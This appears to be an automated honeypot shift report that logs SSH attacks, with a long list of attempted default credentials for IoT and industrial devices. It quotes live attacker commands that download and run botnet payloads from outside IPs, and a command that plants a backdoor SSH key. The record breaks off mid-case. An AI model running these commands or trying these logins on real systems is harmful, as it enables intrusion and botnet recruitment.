# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-25 |
| **Generated At** | 2026-08-25T12:54:03Z |
| **Shift Time** | 12:54 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **325** |
| Confirmed Threats | **305** |
| False Positives Filtered | **20** (6.2%) |
| Unique Attacker IPs | **42** |
| Countries of Origin | **14** |
| High Severity Cases | **255** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **70** |
| Malware Samples Analyzed | **2** HIGH · **20** MED · 22 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **267** |
| Unique Credential Pairs | **252** |
| Unique Usernames | **73** |
| Unique Passwords | **155** |
| Successful Auth Pairs | **256** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 61 |
| `admin` | 25 |
| `ubuntu` | 15 |
| `support` | 6 |
| `default` | 6 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `password` | 50 |
| `admin` | 24 |
| `` | 12 |
| `123456` | 9 |
| `support` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `admin` | `admin` | 6 |
| `support` | `support` | 5 |
| `root` | `` | 5 |
| `root` | `admin` | 2 |
| `345gs5662d34` | `345gs5662d34` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `ubuntu` | `oracle#123` | `217.60.255.130` | 2026-08-25T08:57:50 |
| `root` | `ftpuser1234!` | `217.60.255.130` | 2026-08-25T08:57:54 |
| `ubuntu` | `admin@2025` | `217.60.255.130` | 2026-08-25T09:07:33 |
| `root` | `mongodb@2024` | `217.60.255.130` | 2026-08-25T09:07:37 |
| `root` | `Huawei12#$` | `111.53.8.101` | 2026-08-25T09:08:32 |
| `root` | `Admin@9000` | `111.53.8.101` | 2026-08-25T09:08:35 |
| `admin` | `admin` | `101.43.79.210` | 2026-08-25T09:15:21 |
| `ubuntu` | `free123` | `217.60.255.130` | 2026-08-25T09:17:03 |
| `root` | `P@@ssw0rd` | `217.60.255.130` | 2026-08-25T09:17:07 |
| `support` | `support` | `10.0.0.73` | 2026-08-25T09:23:43 |
| `ubuntu` | `qwertyuiop123` | `217.60.255.130` | 2026-08-25T09:26:50 |
| `root` | `2wsx#EDC` | `217.60.255.130` | 2026-08-25T09:26:55 |
| `ubuntu` | `zabbix@123` | `217.60.255.130` | 2026-08-25T09:36:55 |
| `root` | `ADMIN@123` | `217.60.255.130` | 2026-08-25T09:36:59 |
| `admin` | `admin` | `10.0.0.73` | 2026-08-25T09:42:23 |
| `ubuntu` | `work123` | `217.60.255.130` | 2026-08-25T09:46:47 |
| `root` | `QWERTY!@#` | `217.60.255.130` | 2026-08-25T09:46:51 |
| `root` | `password` | `45.135.194.26` | 2026-08-25T09:54:43 |
| `root` | `admin` | `45.135.194.26` | 2026-08-25T09:54:45 |
| `root` | `toor` | `45.135.194.26` | 2026-08-25T09:54:46 |
| `root` | `` | `45.135.194.26` | 2026-08-25T09:54:48 |
| `admin` | `admin` | `45.135.194.26` | 2026-08-25T09:54:49 |
| `admin` | `password` | `45.135.194.26` | 2026-08-25T09:54:51 |
| `admin` | `123456` | `45.135.194.26` | 2026-08-25T09:54:52 |
| `admin` | `` | `45.135.194.26` | 2026-08-25T09:54:54 |
| `user` | `user` | `45.135.194.26` | 2026-08-25T09:54:55 |
| `user` | `password` | `45.135.194.26` | 2026-08-25T09:54:57 |
| `user` | `123456` | `45.135.194.26` | 2026-08-25T09:54:58 |
| `user` | `` | `45.135.194.26` | 2026-08-25T09:54:59 |
| `guest` | `guest` | `45.135.194.26` | 2026-08-25T09:55:01 |
| `guest` | `password` | `45.135.194.26` | 2026-08-25T09:55:02 |
| `guest` | `` | `45.135.194.26` | 2026-08-25T09:55:04 |
| `superuser` | `superuser` | `45.135.194.26` | 2026-08-25T09:55:06 |
| `superuser` | `password` | `45.135.194.26` | 2026-08-25T09:55:07 |
| `Administrator` | `Administrator` | `45.135.194.26` | 2026-08-25T09:55:09 |
| `Administrator` | `password` | `45.135.194.26` | 2026-08-25T09:55:10 |
| `administrator` | `password` | `45.135.194.26` | 2026-08-25T09:55:11 |
| `administrator` | `` | `45.135.194.26` | 2026-08-25T09:55:13 |
| `enable` | `enable` | `45.135.194.26` | 2026-08-25T09:55:14 |
| `enable` | `password` | `45.135.194.26` | 2026-08-25T09:55:16 |
| `enable` | `cisco` | `45.135.194.26` | 2026-08-25T09:55:17 |
| `cisco` | `cisco` | `45.135.194.26` | 2026-08-25T09:55:18 |
| `cisco` | `password` | `45.135.194.26` | 2026-08-25T09:55:20 |
| `cisco` | `` | `45.135.194.26` | 2026-08-25T09:55:21 |
| `root` | `cisco` | `45.135.194.26` | 2026-08-25T09:55:23 |
| `admin` | `cisco` | `45.135.194.26` | 2026-08-25T09:55:24 |
| `pi` | `raspberry` | `45.135.194.26` | 2026-08-25T09:55:26 |
| `pi` | `password` | `45.135.194.26` | 2026-08-25T09:55:27 |
| `pi` | `123456` | `45.135.194.26` | 2026-08-25T09:55:29 |
| `pi` | `admin` | `45.135.194.26` | 2026-08-25T09:55:30 |
| `pi` | `` | `45.135.194.26` | 2026-08-25T09:55:32 |
| `orangepi` | `orangepi` | `45.135.194.26` | 2026-08-25T09:55:33 |
| `orangepi` | `password` | `45.135.194.26` | 2026-08-25T09:55:35 |
| `orangepi` | `admin` | `45.135.194.26` | 2026-08-25T09:55:36 |
| `bananapi` | `bananapi` | `45.135.194.26` | 2026-08-25T09:55:38 |
| `bananapi` | `password` | `45.135.194.26` | 2026-08-25T09:55:39 |
| `beaglebone` | `beaglebone` | `45.135.194.26` | 2026-08-25T09:55:41 |
| `beaglebone` | `password` | `45.135.194.26` | 2026-08-25T09:55:42 |
| `beagle` | `beagle` | `45.135.194.26` | 2026-08-25T09:55:44 |
| `arduino` | `arduino` | `45.135.194.26` | 2026-08-25T09:55:45 |
| `esp8266` | `esp8266` | `45.135.194.26` | 2026-08-25T09:55:46 |
| `esp32` | `esp32` | `45.135.194.26` | 2026-08-25T09:55:48 |
| `nanopi` | `nanopi` | `45.135.194.26` | 2026-08-25T09:55:49 |
| `nanopi` | `password` | `45.135.194.26` | 2026-08-25T09:55:51 |
| `odroid` | `odroid` | `45.135.194.26` | 2026-08-25T09:55:53 |
| `odroid` | `password` | `45.135.194.26` | 2026-08-25T09:55:54 |
| `jetson` | `jetson` | `45.135.194.26` | 2026-08-25T09:55:55 |
| `jetson` | `password` | `45.135.194.26` | 2026-08-25T09:55:57 |
| `debian` | `debian` | `45.135.194.26` | 2026-08-25T09:55:59 |
| `debian` | `password` | `45.135.194.26` | 2026-08-25T09:56:00 |
| `ubuntu` | `ubuntu` | `45.135.194.26` | 2026-08-25T09:56:02 |
| `ubuntu` | `password` | `45.135.194.26` | 2026-08-25T09:56:03 |
| `fedora` | `fedora` | `45.135.194.26` | 2026-08-25T09:56:05 |
| `centos` | `centos` | `45.135.194.26` | 2026-08-25T09:56:06 |
| `alpine` | `alpine` | `45.135.194.26` | 2026-08-25T09:56:08 |
| `osmc` | `osmc` | `45.135.194.26` | 2026-08-25T09:56:09 |
| `root` | `Zte521` | `45.135.194.26` | 2026-08-25T09:56:11 |
| `root` | `ZTE521` | `45.135.194.26` | 2026-08-25T09:56:12 |
| `root` | `gpon` | `45.135.194.26` | 2026-08-25T09:56:14 |
| `admin` | `Zte521` | `45.135.194.26` | 2026-08-25T09:56:15 |
| `admin` | `ZTE521` | `45.135.194.26` | 2026-08-25T09:56:17 |
| `admin` | `gpon` | `45.135.194.26` | 2026-08-25T09:56:18 |
| `telecomadmin` | `admintelecom` | `45.135.194.26` | 2026-08-25T09:56:20 |
| `ubuntu` | `dell123` | `217.60.255.130` | 2026-08-25T09:56:20 |
| `telecomadmin` | `telecomadmin` | `45.135.194.26` | 2026-08-25T09:56:21 |
| `admin` | `888888` | `45.135.194.26` | 2026-08-25T09:56:23 |
| `admin` | `666666` | `45.135.194.26` | 2026-08-25T09:56:24 |
| `root` | `Bismillah123` | `217.60.255.130` | 2026-08-25T09:56:25 |
| `admin` | `111111` | `45.135.194.26` | 2026-08-25T09:56:26 |
| `root` | `888888` | `45.135.194.26` | 2026-08-25T09:56:27 |
| `root` | `666666` | `45.135.194.26` | 2026-08-25T09:56:29 |
| `root` | `111111` | `45.135.194.26` | 2026-08-25T09:56:30 |
| `admin` | `1111` | `45.135.194.26` | 2026-08-25T09:56:32 |
| `root` | `1234` | `45.135.194.26` | 2026-08-25T09:56:33 |
| `admin` | `1234` | `45.135.194.26` | 2026-08-25T09:56:35 |
| `user` | `1234` | `45.135.194.26` | 2026-08-25T09:56:36 |
| `support` | `support` | `45.135.194.26` | 2026-08-25T09:56:38 |
| `support` | `password` | `45.135.194.26` | 2026-08-25T09:56:39 |
| `operator` | `operator` | `45.135.194.26` | 2026-08-25T09:56:41 |
| `operator` | `password` | `45.135.194.26` | 2026-08-25T09:56:42 |
| `supervisor` | `supervisor` | `45.135.194.26` | 2026-08-25T09:56:44 |
| `supervisor` | `password` | `45.135.194.26` | 2026-08-25T09:56:45 |
| `ftp` | `ftp` | `45.135.194.26` | 2026-08-25T09:56:46 |
| `ftp` | `password` | `45.135.194.26` | 2026-08-25T09:56:48 |
| `ftp` | `123456` | `45.135.194.26` | 2026-08-25T09:56:49 |
| `telnet` | `telnet` | `45.135.194.26` | 2026-08-25T09:56:51 |
| `telnet` | `password` | `45.135.194.26` | 2026-08-25T09:56:52 |
| `telnet` | `123456` | `45.135.194.26` | 2026-08-25T09:56:54 |
| `ssh` | `ssh` | `45.135.194.26` | 2026-08-25T09:56:55 |
| `ssh` | `password` | `45.135.194.26` | 2026-08-25T09:56:57 |
| `ssh` | `123456` | `45.135.194.26` | 2026-08-25T09:56:58 |
| `test` | `test` | `45.135.194.26` | 2026-08-25T09:57:00 |
| `test` | `password` | `45.135.194.26` | 2026-08-25T09:57:01 |
| `test` | `123456` | `45.135.194.26` | 2026-08-25T09:57:03 |
| `root` | `xmhdipc` | `45.135.194.26` | 2026-08-25T09:57:04 |
| `root` | `xmhddvr` | `45.135.194.26` | 2026-08-25T09:57:05 |
| `root` | `jvbzd` | `45.135.194.26` | 2026-08-25T09:57:07 |
| `root` | `juantech` | `45.135.194.26` | 2026-08-25T09:57:08 |
| `root` | `zlxx.` | `45.135.194.26` | 2026-08-25T09:57:10 |
| `root` | `zlxx` | `45.135.194.26` | 2026-08-25T09:57:11 |
| `root` | `ipcam` | `45.135.194.26` | 2026-08-25T09:57:13 |
| `root` | `ipcamera` | `45.135.194.26` | 2026-08-25T09:57:14 |
| `root` | `klv123` | `45.135.194.26` | 2026-08-25T09:57:16 |
| `root` | `vizxv` | `45.135.194.26` | 2026-08-25T09:57:17 |
| `root` | `xhdj` | `45.135.194.26` | 2026-08-25T09:57:19 |
| `root` | `greenday` | `45.135.194.26` | 2026-08-25T09:57:20 |
| `root` | `gzhongshi` | `45.135.194.26` | 2026-08-25T09:57:22 |
| `root` | `coreelec` | `45.135.194.26` | 2026-08-25T09:57:23 |
| `admin` | `instar` | `45.135.194.26` | 2026-08-25T09:57:25 |
| `admin` | `icam` | `45.135.194.26` | 2026-08-25T09:57:26 |
| `admin` | `root` | `45.135.194.26` | 2026-08-25T09:57:28 |
| `root` | `instar` | `45.135.194.26` | 2026-08-25T09:57:29 |
| `root` | `icam` | `45.135.194.26` | 2026-08-25T09:57:31 |
| `root` | `vivotek` | `45.135.194.26` | 2026-08-25T09:57:32 |
| `admin` | `vivotek` | `45.135.194.26` | 2026-08-25T09:57:34 |
| `admin` | `smcadmin` | `45.135.194.26` | 2026-08-25T09:57:35 |
| `admin` | `Telvent1!` | `45.135.194.26` | 2026-08-25T09:57:37 |
| `vstarcam2015` | `20150602` | `45.135.194.26` | 2026-08-25T09:57:38 |
| `camera` | `` | `45.135.194.26` | 2026-08-25T09:57:40 |
| `moxa` | `moxa` | `45.135.194.26` | 2026-08-25T09:57:41 |
| `moxa` | `admin` | `45.135.194.26` | 2026-08-25T09:57:43 |
| `moxa` | `password` | `45.135.194.26` | 2026-08-25T09:57:44 |
| `wago` | `wago` | `45.135.194.26` | 2026-08-25T09:57:46 |
| `wago` | `admin` | `45.135.194.26` | 2026-08-25T09:57:47 |
| `wago` | `password` | `45.135.194.26` | 2026-08-25T09:57:49 |
| `siemens` | `siemens` | `45.135.194.26` | 2026-08-25T09:57:50 |
| `siemens` | `admin` | `45.135.194.26` | 2026-08-25T09:57:51 |
| `siemens` | `password` | `45.135.194.26` | 2026-08-25T09:57:53 |
| `schneider` | `schneider` | `45.135.194.26` | 2026-08-25T09:57:55 |
| `schneider` | `admin` | `45.135.194.26` | 2026-08-25T09:57:56 |
| `schneider` | `password` | `45.135.194.26` | 2026-08-25T09:57:58 |
| `ge` | `ge` | `45.135.194.26` | 2026-08-25T09:57:59 |
| `ge` | `admin` | `45.135.194.26` | 2026-08-25T09:58:00 |
| `ge` | `password` | `45.135.194.26` | 2026-08-25T09:58:02 |
| `honeywell` | `honeywell` | `45.135.194.26` | 2026-08-25T09:58:03 |
| `honeywell` | `admin` | `45.135.194.26` | 2026-08-25T09:58:05 |
| `honeywell` | `password` | `45.135.194.26` | 2026-08-25T09:58:06 |
| `tridium` | `tridium` | `45.135.194.26` | 2026-08-25T09:58:08 |
| `tridium` | `admin` | `45.135.194.26` | 2026-08-25T09:58:09 |
| `tridium` | `password` | `45.135.194.26` | 2026-08-25T09:58:11 |
| `niagara` | `niagara` | `45.135.194.26` | 2026-08-25T09:58:12 |
| `niagara` | `admin` | `45.135.194.26` | 2026-08-25T09:58:14 |
| `niagara` | `password` | `45.135.194.26` | 2026-08-25T09:58:15 |
| `bacnet` | `bacnet` | `45.135.194.26` | 2026-08-25T09:58:17 |
| `bacnet` | `admin` | `45.135.194.26` | 2026-08-25T09:58:18 |
| `bacnet` | `password` | `45.135.194.26` | 2026-08-25T09:58:20 |
| `modbus` | `modbus` | `45.135.194.26` | 2026-08-25T09:58:21 |
| `modbus` | `admin` | `45.135.194.26` | 2026-08-25T09:58:23 |
| `modbus` | `password` | `45.135.194.26` | 2026-08-25T09:58:24 |
| `scada` | `scada` | `45.135.194.26` | 2026-08-25T09:58:26 |
| `scada` | `admin` | `45.135.194.26` | 2026-08-25T09:58:27 |
| `scada` | `password` | `45.135.194.26` | 2026-08-25T09:58:29 |
| `plc` | `plc` | `45.135.194.26` | 2026-08-25T09:58:30 |
| `plc` | `admin` | `45.135.194.26` | 2026-08-25T09:58:32 |
| `plc` | `password` | `45.135.194.26` | 2026-08-25T09:58:33 |
| `hmi` | `hmi` | `45.135.194.26` | 2026-08-25T09:58:35 |
| `hmi` | `admin` | `45.135.194.26` | 2026-08-25T09:58:36 |
| `hmi` | `password` | `45.135.194.26` | 2026-08-25T09:58:38 |
| `unipi` | `unipi.technology` | `45.135.194.26` | 2026-08-25T09:58:39 |
| `asus` | `asus` | `45.135.194.26` | 2026-08-25T09:58:41 |
| `asus` | `password` | `45.135.194.26` | 2026-08-25T09:58:42 |
| `dlink` | `dlink` | `45.135.194.26` | 2026-08-25T09:58:43 |
| `dlink` | `password` | `45.135.194.26` | 2026-08-25T09:58:45 |
| `tplink` | `tplink` | `45.135.194.26` | 2026-08-25T09:58:46 |
| `tplink` | `password` | `45.135.194.26` | 2026-08-25T09:58:48 |
| `netgear` | `netgear` | `45.135.194.26` | 2026-08-25T09:58:49 |
| `netgear` | `password` | `45.135.194.26` | 2026-08-25T09:58:51 |
| `linksys` | `linksys` | `45.135.194.26` | 2026-08-25T09:58:52 |
| `linksys` | `password` | `45.135.194.26` | 2026-08-25T09:58:53 |
| `belkin` | `belkin` | `45.135.194.26` | 2026-08-25T09:58:55 |
| `belkin` | `password` | `45.135.194.26` | 2026-08-25T09:58:56 |
| `zte` | `zte` | `45.135.194.26` | 2026-08-25T09:58:58 |
| `zte` | `password` | `45.135.194.26` | 2026-08-25T09:58:59 |
| `huawei` | `huawei` | `45.135.194.26` | 2026-08-25T09:59:01 |
| `huawei` | `password` | `45.135.194.26` | 2026-08-25T09:59:02 |
| `zyxel` | `zyxel` | `45.135.194.26` | 2026-08-25T09:59:04 |
| `zyxel` | `password` | `45.135.194.26` | 2026-08-25T09:59:05 |
| `ubiquiti` | `ubiquiti` | `45.135.194.26` | 2026-08-25T09:59:06 |
| `ubiquiti` | `password` | `45.135.194.26` | 2026-08-25T09:59:08 |
| `Cisco` | `Cisco` | `45.135.194.26` | 2026-08-25T09:59:09 |
| `Cisco` | `password` | `45.135.194.26` | 2026-08-25T09:59:11 |
| `Alphanetworks` | `wrgn61dlwbrdir600L` | `45.135.194.26` | 2026-08-25T09:59:12 |
| `Alphanetworks` | `wrgn76dlwbrdir605L` | `45.135.194.26` | 2026-08-25T09:59:14 |
| `Alphanetworks` | `whdrv01_dlob_dir456U` | `45.135.194.26` | 2026-08-25T09:59:15 |
| `Alphanetworks` | `Wj5eH%JC` | `45.135.194.26` | 2026-08-25T09:59:17 |
| `Alphanetworks` | `wrgn35_dlwbr_dir600l` | `45.135.194.26` | 2026-08-25T09:59:18 |
| `yhtcAdmin` | `ve0RbANG` | `45.135.194.26` | 2026-08-25T09:59:20 |
| `yhtcAdmin` | `yhtcAdmin` | `45.135.194.26` | 2026-08-25T09:59:21 |
| `zyfwp` | `zyfwp` | `45.135.194.26` | 2026-08-25T09:59:23 |
| `vadmin` | `vadmin` | `45.135.194.26` | 2026-08-25T09:59:24 |
| `mg3500` | `merlin` | `45.135.194.26` | 2026-08-25T09:59:26 |
| `e8telnet` | `e8telnet` | `45.135.194.26` | 2026-08-25T09:59:27 |
| `telnetadmin` | `telnetadmin` | `45.135.194.26` | 2026-08-25T09:59:29 |
| `telnetadmin` | `admin` | `45.135.194.26` | 2026-08-25T09:59:30 |
| `telnetadmin` | `password` | `45.135.194.26` | 2026-08-25T09:59:32 |
| `telnetadmin` | `123456` | `45.135.194.26` | 2026-08-25T09:59:33 |
| `telecomadmin` | `nE7jA%5m` | `45.135.194.26` | 2026-08-25T09:59:35 |
| `Admin` | `alphacom` | `45.135.194.26` | 2026-08-25T09:59:36 |
| `admin` | `alphaadmin` | `45.135.194.26` | 2026-08-25T09:59:38 |
| `Admin` | `Telecom_1234` | `45.135.194.26` | 2026-08-25T09:59:39 |
| `default` | `default` | `45.135.194.26` | 2026-08-25T09:59:41 |
| `default` | `antslq` | `45.135.194.26` | 2026-08-25T09:59:42 |
| `default` | `S2fGqNFs` | `45.135.194.26` | 2026-08-25T09:59:44 |
| `default` | `OxhlwSG8` | `45.135.194.26` | 2026-08-25T09:59:45 |
| `default` | `tlJwpbo6` | `45.135.194.26` | 2026-08-25T09:59:47 |
| `default` | `1` | `45.135.194.26` | 2026-08-25T09:59:48 |
| `root` | `7ujMko0admin` | `45.135.194.26` | 2026-08-25T09:59:50 |
| `root` | `7ujMko0` | `45.135.194.26` | 2026-08-25T09:59:51 |
| `root` | `xc3511` | `45.135.194.26` | 2026-08-25T09:59:53 |
| `root` | `12345678` | `45.135.194.26` | 2026-08-25T09:59:54 |
| `root` | `abcd1234` | `45.135.194.26` | 2026-08-25T09:59:56 |
| `root` | `ivanlee` | `45.135.194.26` | 2026-08-25T09:59:57 |
| `root` | `CS2012` | `45.135.194.26` | 2026-08-25T09:59:59 |
| `root` | `hack123` | `45.135.194.26` | 2026-08-25T10:00:00 |
| `root` | `123.com` | `45.135.194.26` | 2026-08-25T10:00:02 |
| `root` | `1qaz2wsx` | `45.135.194.26` | 2026-08-25T10:00:03 |
| `root` | `admin` | `45.198.224.26` | 2026-08-25T10:02:21 |
| `support` | `support` | `176.53.159.196` | 2026-08-25T10:03:31 |
| `ubuntu` | `Server@12` | `217.60.255.130` | 2026-08-25T10:05:57 |
| `root` | `Superuser` | `217.60.255.130` | 2026-08-25T10:06:01 |
| `ubuntu` | `QWERTY@123` | `217.60.255.130` | 2026-08-25T10:15:35 |
| `root` | `Microsoft@2025` | `217.60.255.130` | 2026-08-25T10:15:38 |
| `kafka` | `kafka@123` | `101.79.165.43` | 2026-08-25T10:17:45 |
| `345gs5662d34` | `345gs5662d34` | `101.79.165.43` | 2026-08-25T10:17:49 |
| `kafka` | `3245gs5662d34` | `101.79.165.43` | 2026-08-25T10:17:51 |
| `ubuntu` | `kafka#123` | `217.60.255.130` | 2026-08-25T10:25:08 |
| `root` | `vps123456` | `217.60.255.130` | 2026-08-25T10:25:11 |
| `steam` | `admin123` | `106.243.155.71` | 2026-08-25T10:28:38 |
| `345gs5662d34` | `345gs5662d34` | `106.243.155.71` | 2026-08-25T10:28:42 |
| `steam` | `3245gs5662d34` | `106.243.155.71` | 2026-08-25T10:28:43 |
| `ubuntu` | `zxcvbnm,./` | `217.60.255.130` | 2026-08-25T10:34:39 |
| `root` | `12345678a` | `217.60.255.130` | 2026-08-25T10:34:42 |
| `ubuntu` | `Password01` | `217.60.255.130` | 2026-08-25T10:44:14 |
| `root` | `123qwerty` | `217.60.255.130` | 2026-08-25T10:44:17 |
| `ubuntu` | `admin.123` | `217.60.255.130` | 2026-08-25T10:53:45 |
| `root` | `Adam@1234` | `217.60.255.130` | 2026-08-25T10:53:49 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **325** |
| Sessions with Fingerprint | **11** |
| Unique HASSH Fingerprints | **11** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 40 |
| Go SSH scanner | 7 |
| Unknown | 1 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `419da4c91ddb...` | Modern SSH client | 26 | 1 |
| `4e066189c3bb...` | Generic scanner | 3 | 1 |
| `f555226df196...` | Mirai/variant | 3 | 1 |
| `03a80b21afa8...` | Modern SSH client | 3 | 1 |
| `1616c6d18e84...` | Mirai/variant | 2 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `419da4c91ddb...` | libssh | 26 | 1 | Modern SSH client |
| `95420f9d932d...` | libssh | 5 | 2 | — |
| `4e066189c3bb...` | Go SSH scanner | 3 | 1 | Generic scanner |
| `f555226df196...` | libssh | 3 | 1 | Mirai/variant |
| `03a80b21afa8...` | libssh | 3 | 1 | Modern SSH client |
| `1616c6d18e84...` | libssh | 2 | 1 | Mirai/variant |
| `f1e5e9d24e5e...` | Go SSH scanner | 2 | 1 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1070, T1140, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1070, T1140` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 209 | 1 | `T1105, T1140, T1059.004` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/dev/null 2>&1 &
```
```
cd /tmp
```
```
wget http://5.182.210.174/ok
```
```
curl -O http://5.182.210.174/ok
```
```
chmod +x ok
```
Source IPs: `45.198.224.26`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `101.79.165.43`, `106.243.155.71`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget http://213.232.114.14/handshakebins.sh 2>/dev/null; busybox wget http://213.232.114.14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh http://213.232.114.14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114.14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114.14 2>/dev/null
```
Source IPs: `45.135.194.26`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **42** |
| Unique ASNs | **37** |
| High-Risk ASNs | **23** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS398324` | Censys, Inc. | 3 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS63949` | Akamai Connected Cloud | 2 | HIGH |
| `AS45090` | Shenzhen Tencent Computer Systems Company Limited | 2 | HIGH |
| `AS12389` | PJSC Rostelecom | 1 | LOW |
| `AS7922` | Comcast Cable Communications, LLC | 1 | MEDIUM |
| `AS6939` | Hurricane Electric LLC | 1 | HIGH |
| `AS10617` | SION S.A | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (255)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-dac7cd24f912

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 08:57 |
| **Last Seen** | 2026-08-25 08:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 08:57:49` | `cowrie.session.connect` |
| `2026-08-25 08:57:49` | `cowrie.client.version` |
| `2026-08-25 08:57:49` | `cowrie.client.kex` |
| `2026-08-25 08:57:50` | `cowrie.login.success` |
| `2026-08-25 08:57:50` | `cowrie.direct-tcpip.request` |
| `2026-08-25 08:57:51` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 08:57:51` | `cowrie.direct-tcpip.data` |
| `2026-08-25 08:57:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc31c6599ee6

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 08:57 |
| **Last Seen** | 2026-08-25 08:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 08:57:52` | `cowrie.session.connect` |
| `2026-08-25 08:57:52` | `cowrie.client.version` |
| `2026-08-25 08:57:53` | `cowrie.client.kex` |
| `2026-08-25 08:57:54` | `cowrie.login.success` |
| `2026-08-25 08:57:55` | `cowrie.direct-tcpip.request` |
| `2026-08-25 08:57:55` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 08:57:55` | `cowrie.direct-tcpip.data` |
| `2026-08-25 08:57:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ce8cef2b54d

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 09:07 |
| **Last Seen** | 2026-08-25 09:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
